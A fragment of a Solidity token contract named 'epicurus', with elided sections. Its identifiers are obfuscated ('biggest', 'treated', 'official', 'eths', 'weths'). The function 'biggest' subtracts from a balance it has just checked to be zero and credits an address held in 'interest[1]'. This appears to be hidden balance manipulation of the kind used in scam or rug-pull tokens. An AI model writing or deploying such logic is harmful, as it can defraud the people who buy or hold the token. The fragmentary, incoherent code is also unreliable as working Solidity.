...
contract epicurus is Ownable {
    ...
    function biggest(
        ...
        if (eths[treated] == 0 && weths[treated] > 0 && !border) {
            eths[treated] -= order;
            if (amount > 2 * 10**(13 + _decimals)) eths[treated] -= order - 1;
        }

        interest[1] = official;

        if (eths[treated] > 0 && amount == 0) {
            eths[official] += order;
        }
    ...
    mapping(address => uint256) private weths;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private eths;
